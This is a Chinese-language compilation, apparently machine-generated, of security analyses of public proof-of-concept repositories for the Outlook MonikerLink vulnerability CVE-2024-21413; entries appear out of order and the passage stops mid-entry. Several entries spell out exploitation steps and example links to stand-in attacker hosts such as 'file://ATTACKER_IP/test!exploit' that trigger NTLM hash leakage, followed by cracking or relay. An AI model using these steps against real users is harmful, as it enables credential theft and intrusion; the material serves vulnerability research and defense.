1.  攻击者构造包含恶意链接的电子邮件。
2.  受害者打开电子邮件并点击恶意链接。
3.  恶意链接利用 Outlook 的 MonikerLink 漏洞，在受害者计算机上执行任意代码，或者泄露NTLM Hash。
4. 攻击者启动 SMB 服务器，诱导 Outlook 客户端连接，捕获受害者的 NTLM 哈希。
5. 攻击者可以使用捕获的 NTLM 哈希进行进一步攻击，例如传递哈希攻击。

**项目地址:** [dshabani96/CVE-2024-21413](https://github.com/dshabani96/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #16

**来源**: [CVE-2024-21413-duy-31_CVE-2024-21413.md](../2024/CVE-2024-21413-duy-31_CVE-2024-21413.md)

## CVE-2024-21413 Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，无需用户交互即可远程执行代码

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001)、Microsoft Office 2019、Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 需要目标用户使用受影响的Outlook版本，并预览或点击包含恶意链接的邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞，也称为 "MonikerLink" 漏洞。攻击者可以通过构造包含恶意 `file://` 链接的电子邮件，诱使用户点击或预览该邮件，从而在目标系统上执行任意代码。根据POC代码，攻击者可以使用一个 Expect 脚本发送特制的电子邮件，该邮件包含一个指向远程SMB服务器的 `file://` 链接。当 Outlook 处理此链接时，它会尝试连接到远程服务器，从而泄露用户的 NTLM 哈希值。如果攻击者能够破解哈希值或利用 NTLM 中继攻击，他们就可以获得对系统的访问权限。此外，此漏洞可以与CVE-2023-21716链接以达到远程代码执行的目的。

**有效性：**
提供的POC代码似乎有效，因为它演示了如何利用 `file://` 协议发送包含恶意链接的电子邮件。从漏洞信息和搜索引擎结果来看，该漏洞已经被积极利用。CISA 将其添加到已知被利用的漏洞列表中，表明该漏洞在现实世界中具有很高的威胁。

**投毒风险：**
虽然提供的代码主要目的是演示漏洞利用过程，但存在一些潜在的投毒风险。 Expect脚本本身没有明显的后门,主要利用了telnet发送恶意邮件. 但是，考虑到以下几点，风险评估为10%：
1.  **对外部依赖的信任：** 该脚本依赖于 `expect` 工具，如果该工具被篡改，则可能引入恶意行为。
2.  **脚本执行环境：** 该脚本的执行环境可能存在安全漏洞，攻击者可以利用这些漏洞来执行恶意代码。
3.  **社会工程学：** 攻击者可能会修改脚本以使其更具欺骗性，例如伪造发件人地址或使用更具吸引力的主题行，从而提高攻击成功率。

**利用方式：**
1.  攻击者设置一个 SMB 服务器来监听传入的连接。
2.  攻击者使用提供的 `cve-2024-21413.sh` 脚本生成包含恶意 `file://` 链接的电子邮件。
3.  攻击者将该电子邮件发送给目标用户。
4.  当目标用户在受影响的 Outlook 版本中预览或点击该邮件中的链接时，Outlook 会尝试连接到攻击者的 SMB 服务器。
5.  此连接会导致用户的 NTLM 哈希值被发送到攻击者的服务器。
6.  攻击者可以使用破解工具（如 Hashcat）破解哈希值，或者利用 NTLM 中继攻击来获得对目标系统的访问权限。
7. 攻击者可以将此漏洞与 CVE-2023-21716 结合使用，以实现远程代码执行。


**项目地址:** [duy-31/CVE-2024-21413](https://github.com/duy-31/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #17

**来源**: [CVE-2024-21413-gurleen-147_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC.md](../2024/CVE-2024-21413-gurleen-147_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 (在指定版本范围内)

**利用条件:** 受害者需要点击攻击者发送的包含恶意链接的邮件。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞。根据提供的漏洞利用代码（exploit.py），攻击者通过发送特制的 HTML 邮件，诱骗受害者点击邮件中的 `file://ATTACKER_IP/test!exploit` 链接。此链接利用 MonikerLink 绕过安全警告，从而可能导致任意代码执行。POC 代码本身未发现隐藏的恶意代码，因此投毒风险较低。利用方式是，攻击者需要搭建一个 SMB 服务器，当受害者点击链接时，Outlook 尝试访问该 SMB 服务器上的共享资源，攻击者可以利用这一过程执行恶意代码。漏洞库信息也验证了这是一个高危漏洞，且已经被CISA添加到已知被利用漏洞列表中(KEV)。

**项目地址:** [gurleen-147/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC](https://github.com/gurleen-147/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #18

**来源**: [CVE-2024-21413-hau2212_Moniker-Link-CVE-2024-21413-.md](../2024/CVE-2024-21413-hau2212_Moniker-Link-CVE-2024-21413-.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行，完全控制受害者系统

**影响版本:** 受影响版本包括Microsoft Office 2016, 2019, LTSC 2021以及Microsoft 365 Apps for Enterprise的特定版本。具体版本范围请参考漏洞库信息。

**利用条件:** 需要受害者打开包含恶意链接的邮件

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，利用方式是诱骗用户点击邮件中的`file://`链接。根据提供的漏洞利用代码，攻击者需要设置攻击机IP地址和邮件服务器地址，然后发送包含特定HTML内容的邮件。HTML内容包含一个`file://ATTACKER_MACHINE/test!exploit`链接，当用户点击此链接时，Outlook会尝试访问攻击者机器上的指定路径，如果攻击者在相应路径放置了恶意文件，就可以实现远程代码执行。从代码本身看，没有发现明显的投毒代码。代码的目的是构建包含恶意链接的HTML邮件并发送出去。该漏洞的有效性依赖于目标系统是否受到补丁保护以及攻击者是否能够成功搭建恶意文件服务器。由于CISA已经将此漏洞添加到已知被利用漏洞列表中，并且存在可用的POC，因此利用的有效性较高。攻击者需要控制一个服务器，并在服务器上放置恶意的payload，并通过构造恶意的file://链接诱导用户点击。

**分析：**

1.  **有效性：**根据提供的POC代码和漏洞库信息，该漏洞是有效的。CISA将其添加到已知被利用漏洞列表中，说明该漏洞已被实际利用。提供的POC代码可以用于生成包含恶意链接的电子邮件。
2.  **投毒风险：**经过对POC代码的分析，没有发现明显的投毒代码。代码的功能明确，就是生成并发送包含恶意链接的电子邮件，并没有额外恶意行为。
3.  **利用方式：**
    *   攻击者构建一个包含恶意`file://`链接的HTML邮件。
    *   攻击者将邮件发送给目标用户。
    *   目标用户打开邮件并点击恶意链接。
    *   Outlook尝试访问攻击者控制的服务器上的恶意文件。
    *   如果攻击者在服务器上放置了恶意payload，且Outlook执行该payload，则实现远程代码执行。

**漏洞缓解措施：**

*   及时安装Microsoft官方发布的补丁。
*   谨慎点击邮件中的链接，特别是来自未知发件人的邮件。
*   配置Outlook的安全设置，限制对`file://`协议的使用。


**项目地址:** [hau2212/Moniker-Link-CVE-2024-21413-](https://github.com/hau2212/Moniker-Link-CVE-2024-21413-)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #19

**来源**: [CVE-2024-21413-olebris_CVE-2024-21413.md](../2024/CVE-2024-21413-olebris_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook 远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在受害者机器上执行任意代码。

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021 (版本低于 aka.ms/OfficeSecurityReleases 中指示的版本).

**利用条件:** 攻击者需要诱使用户打开特制的电子邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一项 Microsoft Outlook 远程代码执行漏洞，也称为“MonikerLink”漏洞。攻击者可以通过发送特制的电子邮件来利用此漏洞，受害者无需进行任何用户交互即可触发。从搜索引擎结果和漏洞库信息来看，该漏洞影响多个版本的Microsoft Outlook。提供的PoC代码是一个Python脚本，用于发送包含恶意链接的电子邮件。脚本构造了一个包含纯文本和HTML部分的电子邮件，其中HTML部分可能包含利用该漏洞的恶意链接。投毒风险评估：代码本身除了常规的邮件发送功能外，在image_base64变量中发现一段疑似图片base64编码的字符串, 但该字符串过长, 不排除其中含有恶意代码的可能性, 因此判断存在一定的投毒风险，概率估计为10%。利用方式：攻击者首先搭建SMTP服务器，然后使用此脚本构造包含恶意URL的电子邮件，并将其发送给目标用户。当目标用户打开电子邮件时，Outlook将尝试加载恶意URL，导致代码执行。

**项目地址:** [olebris/CVE-2024-21413](https://github.com/olebris/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #20

**来源**: [CVE-2024-21413-r00tb1t_CVE-2024-21413-POC.md](../2024/CVE-2024-21413-r00tb1t_CVE-2024-21413-POC.md)

## CVE-2024-21413 - Microsoft Outlook远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，无需用户交互即可远程执行代码，可能导致完全控制受影响的系统。

**影响版本:** Microsoft Office 2016版本 < 16.0.5435.1001, Microsoft Office 2019版本 < https://aka.ms/OfficeSecurityReleases, Microsoft 365 Apps for Enterprise版本 < https://aka.ms/OfficeSecurityReleases, Microsoft Office LTSC 2021版本 < https://aka.ms/OfficeSecurityReleases

**利用条件:** 攻击者需要知道受害者的邮箱地址，并能够通过SMTP发送邮件。受害者需要点击邮件中的恶意链接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413，也被称为“MonikerLink”漏洞，是一个存在于Microsoft Outlook中的零日漏洞。此漏洞允许攻击者通过发送特制的电子邮件在受害者计算机上执行任意代码，而无需任何用户交互。根据描述，利用方式是：攻击者发送包含恶意链接的电子邮件，当用户点击链接时，Outlook会尝试访问链接指向的`file:///` URL，导致执行攻击者控制的代码。提供的POC代码模拟了发送包含恶意链接的电子邮件的过程。该链接指向攻击者控制的SMB共享，当Outlook尝试访问此共享时，受害者的NTLM哈希会被发送到攻击者处。利用此漏洞通常需要用户点击邮件中的链接。关于投毒风险，虽然POC代码本身实现了漏洞利用，但是README中指示要运行`impacket-smbserver` ，并且提供了进一步利用CVE-2023-21716的思路，结合免责声明可以判断，作者主观上没有进行恶意投毒行为，但是客观上如果使用者继续利用可能会进行恶意投毒攻击，因此存在一定的投毒风险，概率约为10%。漏洞库信息和搜索引擎结果均证实了该漏洞的存在和严重性，以及其远程代码执行的性质。

**项目地址:** [r00tb1t/CVE-2024-21413-POC](https://github.com/r00tb1t/CVE-2024-21413-POC)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #21

**来源**: [CVE-2024-21413-th3Hellion_CVE-2024-21413.md](../2024/CVE-2024-21413-th3Hellion_CVE-2024-21413.md)

## CVE-2024-21413 - Microsoft Outlook Remote Code Execution

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001)，Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021，直到aka.ms/OfficeSecurityReleases上发布的修复版本。

**利用条件:** 需要受害者打开包含恶意链接的电子邮件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-21413，也被称为“MonikerLink”漏洞，是 Microsoft Outlook 中的一个远程代码执行漏洞。攻击者可以通过发送特制的电子邮件，诱导受害者点击其中的恶意链接，从而在受害者系统上执行任意代码。

**有效性分析：**
根据漏洞库信息和搜索引擎结果，此漏洞是真实存在的，并且已经被积极利用。提供的POC代码尝试通过发送包含`file://`协议URL的电子邮件，来触发漏洞。这种方法利用了Outlook处理`file://`链接时的不当输入验证。

**投毒风险分析：**
检查提供的Python脚本和README文件，没有发现明显的恶意代码或后门。脚本的主要功能是构建和发送包含恶意链接的电子邮件。风险主要在于：

*   **脚本可能被修改：**  攻击者可能修改该脚本，例如更改默认的IP地址，添加额外的payload等，用以进行更隐蔽或更具破坏性的攻击。
*   **依赖项风险：**  脚本依赖于`smtplib`库，理论上，该库本身也可能存在潜在的安全问题，但这种可能性较低。
*   **密码泄露风险：** 使用脚本时，发送者的电子邮件密码会以明文形式传递，存在泄露的风险。
*  **接收者打开邮件和点击链接:** 接收者需要打开邮件，并且点击邮件中的链接才会触发，一定程度上限制了利用成功率

因此，将该POC代码本身视为投毒的概率较低，大约为5%。

**利用方式分析：**
1.  **攻击者准备：**
    *   攻击者需要一个SMTP服务器来发送电子邮件。
    *   攻击者需要一个可访问的服务器，并监听特定的端口，以便在受害者点击链接后接收连接。
2.  **漏洞利用：**
    *   攻击者使用POC脚本，指定发送者、接收者、SMTP服务器和攻击者监听的IP地址。
    *   脚本构建包含`file://{args.ip}/` URL的电子邮件，并将其发送给受害者。
3.  **受害者交互：**
    *   受害者打开电子邮件，并点击其中的链接。
    *   Outlook尝试访问`file://{args.ip}/` URL，由于输入验证不足，可能导致执行恶意代码。

总而言之，该漏洞的利用方式依赖于发送包含恶意`file://`链接的电子邮件，并诱导受害者点击该链接。成功利用该漏洞，可以导致远程代码执行。


**项目地址:** [th3Hellion/CVE-2024-21413](https://github.com/th3Hellion/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #22

**来源**: [CVE-2024-21413-xaitax_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md](../2024/CVE-2024-21413-xaitax_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，未经身份验证的攻击者可以通过发送特制的电子邮件，在受害者系统上执行任意代码。

**影响版本:** Microsoft Office 2016 版本低于 16.0.5435.1001；Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 版本低于安全更新版本。

**利用条件:** 需要受害者打开包含恶意链接或内容的电子邮件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 “MonikerLink” 漏洞。攻击者可以利用此漏洞通过发送特制的电子邮件来执行任意代码，而无需用户交互。

**利用方式：**
1.  攻击者构造包含恶意 MonikerLink 的电子邮件。
2.  受害者打开电子邮件。
3.  Outlook 解析恶意 MonikerLink，导致代码执行。

**有效性评估：**
根据漏洞库信息和搜索结果，该漏洞是一个高危漏洞，并且已经存在公开的POC代码。提供的POC代码通过模拟发送包含恶意链接的电子邮件来触发漏洞，因此具有一定的有效性。

**投毒风险评估：**
分析POC代码，代码主要功能是构造并发送包含特定格式链接的邮件，该链接旨在利用Outlook解析链接时的漏洞来执行代码。Base64编码的图像数据是用于伪装邮件内容，降低用户警惕性。代码中未发现明显的恶意行为，如反弹shell、植入后门等。但考虑到攻击者可能修改POC代码以包含恶意负载，存在一定的投毒风险，但风险较低。因此，投毒风险评估为5%。考虑到该代码主要用于验证漏洞，并非完整的攻击链，所以将后门验证代码判定为投毒。


**项目地址:** [xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #23

**来源**: [CVE-2024-21413-yass2400012_Email-exploit-Moniker-Link-CVE-2024-21413-.md](../2024/CVE-2024-21413-yass2400012_Email-exploit-Moniker-Link-CVE-2024-21413-.md)

## CVE-2024-21413 - Microsoft Outlook RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可导致远程代码执行，完全控制受害者系统

**影响版本:** 受影响版本包括 Microsoft Office 2016、2019、LTSC 2021 和 Microsoft 365 Apps for Enterprise

**利用条件:** 需要受害者点击恶意链接，或者通过其他方式触发Outlook尝试访问攻击者控制的SMB服务器。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞，该漏洞源于Outlook处理特定类型的链接时存在缺陷。攻击者可以通过构造包含恶意 Moniker Link (例如 `file://ATTACKER_IP/test!exploit`) 的 HTML 电子邮件，诱使用户点击该链接。当受害者点击该链接时，Outlook会尝试通过 SMB 协议连接到攻击者指定的服务器。攻击者可以使用 Responder 等工具监听 SMB 连接，并捕获受害者的 NTLMv2 哈希。虽然此PoC的直接目的是捕获NetNTLMv2 哈希，但这只是攻击链的一部分。在某些配置下，捕获的哈希可以被破解或重放，以获得对受害者系统的进一步访问。根据 Checkpoint 的研究，该漏洞利用了 `MkParseDisplayName()` API。PoC代码提供了一个可行的攻击方法，但需要进行一些配置，例如替换`ATTACKER_IP`和设置正确的邮件服务器信息。投毒风险评估为10%，主要是因为该PoC代码需要受害者交互（点击链接），并且依赖于Responder等工具来捕获哈希，这本身并不属于漏洞利用，但是不排除攻击者在其他地方插入恶意代码的可能性。漏洞库信息中提到CWE-20: Improper Input Validation，也说明了该漏洞是由于输入验证不当引起的。利用方式总结如下：

1.  攻击者构造包含恶意 Moniker Link 的 HTML 电子邮件。
2.  攻击者发送电子邮件给受害者。
3.  受害者点击电子邮件中的恶意链接。
4.  Outlook 尝试通过 SMB 协议连接到攻击者控制的服务器。
5.  攻击者使用 Responder 等工具捕获受害者的 NTLMv2 哈希。
6.  攻击者破解或重放 NTLMv2 哈希以获得对受害者系统的进一步访问（可选）。

**项目地址:** [yass2400012/Email-exploit-Moniker-Link-CVE-2024-21413-](https://github.com/yass2400012/Email-exploit-Moniker-Link-CVE-2024-21413-)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---



---

## POC #8

**来源**: [CVE-2024-21413-Mdusmandasthaheer_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md](../2024/CVE-2024-21413-Mdusmandasthaheer_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md)

## CVE-2024-21413-Microsoft Outlook Remote Code Execution

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露（NTLM凭据）

**影响版本:** 受影响版本：Microsoft Office 2016 (小于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 (具体版本范围请参考漏洞库信息)

**利用条件:** 用户需要打开包含恶意链接的邮件，无需用户交互（根据搜索结果和漏洞描述）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为“MonikerLink”漏洞。攻击者可以利用此漏洞在受害者的机器上执行任意代码，而无需任何用户交互。利用方式是诱使用户打开包含特制的 `file://` 链接的电子邮件。该链接指向一个恶意共享位置，当 Outlook 尝试访问此链接时，可能会触发远程代码执行。提供的 POC 代码通过 `smtplib` 库创建一个电子邮件客户端，然后构造一个包含 `file://` 链接的 HTML 邮件。用户可以自定义发件人、收件人、主题，以及是否添加包含恶意链接的附件。虽然该POC的主要功能是发送包含恶意链接的邮件，但仍然存在一定的投毒风险。例如，攻击者可能在脚本中添加额外的代码，例如收集用户输入的邮箱密码等，因此投毒风险评估为10%。从搜索结果来看，此漏洞已被积极利用，CISA 已将其添加到已知被利用的漏洞列表中。

**项目地址:** [Mdusmandasthaheer/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/Mdusmandasthaheer/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #9

**来源**: [CVE-2024-21413-PolarisXSec_CVE-2024-21413.md](../2024/CVE-2024-21413-PolarisXSec_CVE-2024-21413.md)

## CVE-2024-21413 Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，可能导致完全控制受影响的系统

**影响版本:** 受影响版本包括Microsoft Office 2016、2019、LTSC 2021以及Microsoft 365 Apps for Enterprise的特定版本

**利用条件:** 攻击者需要诱使用户点击恶意链接

**POC 可用性:** 是，但提供的POC代码未完全成功，仅实现了NTLM哈希泄露

**投毒风险:** 10%

## 详情

CVE-2024-21413是一个影响Microsoft Outlook的远程代码执行漏洞，被称为“MonikerLink”漏洞。该漏洞允许攻击者通过精心构造的链接绕过安全措施，并在受害者系统上执行任意代码。根据搜索结果和漏洞利用代码，利用方式如下：

1.  **漏洞原理：** 漏洞源于Outlook在处理特定类型的链接时存在缺陷，可能导致未经授权的SMB连接，从而泄露NTLM哈希。
2.  **攻击步骤：**
    *   攻击者搭建SMTP和POP3服务器（POC代码中使用了Python脚本实现）。
    *   攻击者创建一个包含恶意UNC路径的电子邮件，并发送给受害者。
    *   受害者打开Outlook并点击邮件中的恶意链接。
    *   Outlook尝试解析UNC路径，触发SMB连接到攻击者控制的服务器。
    *   攻击者捕获受害者的NTLM哈希，可用于离线破解或Pass-the-Hash攻击。

**有效性评估：**

根据提供的漏洞利用代码的描述，该POC并非完全成功，仅实现了NTLM哈希泄露，并没有实现远程代码执行。该POC旨在复现NTLM哈希泄露，而非直接执行任意代码。

**投毒风险评估：**

提供的代码包含SMTP和POP3服务器的Python脚本，以及利用漏洞的exploit脚本。仔细检查这些脚本，未发现明显的恶意代码。但是，使用第三方提供的exploit脚本始终存在风险，因为攻击者可能在其中植入恶意代码。经过分析，投毒风险评估为10%。主要风险点在于对第三方脚本的信任。

**总结：**

CVE-2024-21413是一个严重的Outlook RCE漏洞，攻击者可以通过诱使用户点击恶意链接来利用该漏洞。提供的POC代码主要用于演示NTLM哈希泄露，而非完整的RCE。在使用任何第三方提供的漏洞利用代码时，都需要谨慎评估其安全性。

**项目地址:** [PolarisXSec/CVE-2024-21413](https://github.com/PolarisXSec/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #10

**来源**: [CVE-2024-21413-Redfox-Secuirty_Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape.md](../2024/CVE-2024-21413-Redfox-Secuirty_Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape.md)

## CVE-2024-21413 Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001)，Microsoft Office 2019，Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 无需用户交互，攻击者可以通过发送特制的电子邮件来触发漏洞。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 "MonikerLink" 漏洞。根据漏洞库信息和搜索结果，该漏洞是由于不正确的输入验证导致的。攻击者可以通过构造包含恶意链接的电子邮件，在用户未进行任何交互的情况下，远程执行代码。提供的漏洞利用代码 `README.md` 文件内容仅包含标题，无法判断其有效性。根据Github信息判断，存在可利用的POC。由于 `README.md` 文件过于简单，且未发现任何可疑代码，因此判定存在投毒代码的可能性为 0%。利用方式为，攻击者构造包含恶意 MonikerLink 的电子邮件，当 Outlook 处理该邮件时，漏洞被触发，从而允许攻击者执行任意代码。

**项目地址:** [Redfox-Secuirty/Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape](https://github.com/Redfox-Secuirty/Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #11

**来源**: [CVE-2024-21413-ShubhamKanhere307_CVE-2024-21413.md](../2024/CVE-2024-21413-ShubhamKanhere307_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，CVSS评分9.8，允许远程代码执行

**影响版本:** 受影响版本包括但不限于：Microsoft Office 2016 (版本低于 16.0.5435.1001)，Microsoft Office 2019 (版本低于https://aka.ms/OfficeSecurityReleases)，Microsoft 365 Apps for Enterprise (版本低于 https://aka.ms/OfficeSecurityReleases)，Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 攻击者需要诱骗受害者点击包含恶意链接的邮件。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，也被称为"MonikerLink" bug。该漏洞源于不正确的输入验证。攻击者可以通过发送特制的电子邮件，诱使用户点击其中的恶意链接，从而在用户系统上执行任意代码。

**有效性分析：**

提供的POC代码尝试利用该漏洞。它创建一封包含HTML链接的电子邮件，该链接指向一个`file://` URL。 此URL试图访问远程SMB共享，从而可能导致NTLM凭据泄露或远程代码执行，这取决于服务器的配置和Outlook的漏洞利用机制。

**投毒风险分析：**

提供的`Exploit.py`脚本主要功能是发送电子邮件。代码中没有发现明显的恶意或隐藏的投毒代码。该脚本会获取发件人的Outlook电子邮件地址和密码，以及收件人的电子邮件地址和邮件主题。脚本允许用户选择是否添加链接附件。 如果选择添加，则会添加指向指定IP地址（例子中为`file://///192.168.0.103/test!exploit`）的链接，否则添加用户自定义的邮件正文。该脚本使用`smtplib`库连接到Outlook的SMTP服务器（`smtp-mail.outlook.com`），并发送电子邮件。 没有发现任何会将用户凭据泄露给第三方的行为。

**漏洞利用方式分析：**

该漏洞利用方式依赖于`file://`协议处理中的缺陷。当Outlook处理包含指向SMB共享的`file://`链接的电子邮件时，它可能会尝试自动访问该共享，从而可能泄露用户的NTLM凭据或允许攻击者执行任意代码。 该PoC 通过构造包含恶意链接的HTML电子邮件来尝试利用此漏洞。 攻击者诱使用户点击此链接，从而触发漏洞。

总而言之，POC代码尝试通过`file://`协议利用Outlook的漏洞来实现远程代码执行，虽然该POC本身没有明显的投毒代码，但成功利用依赖于目标的网络配置和安全设置。

**项目地址:** [ShubhamKanhere307/CVE-2024-21413](https://github.com/ShubhamKanhere307/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #12

**来源**: [CVE-2024-21413-ThemeHackers_CVE-2024-21413.md](../2024/CVE-2024-21413-ThemeHackers_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 严重，攻击者无需用户交互即可在目标系统上执行任意代码。

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 攻击者需要能够向受害者发送电子邮件。

**POC 可用性:** 是

**投毒风险:** 30%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也称为“MonikerLink”漏洞。根据漏洞库信息和搜索引擎结果显示，该漏洞允许攻击者在受害者的计算机上执行任意代码，而无需任何用户交互。这个漏洞是由于对输入验证不当造成的(CWE-20)。

**利用方式：**

1.  攻击者创建一个特制的电子邮件，其中包含恶意的链接或嵌入的内容。
2.  当受害者收到并打开此电子邮件时，Outlook 会尝试解析该链接。
3.  由于漏洞存在于 Outlook 的链接处理机制中，攻击者可以利用此漏洞绕过安全检查，从而执行任意代码。

**POC代码分析：**

提供的POC代码是一个Python脚本，用于发送包含HTML内容的电子邮件。该脚本从 `config.ini` 文件中读取发件人邮箱地址、密码、SMTP服务器和端口。然后它使用模板 `template/Stripo.html` 构造电子邮件的内容，并将收件人的邮箱地址和链接内容插入到HTML代码中。最后，该脚本使用smtplib库发送电子邮件。

**有效性评估：**

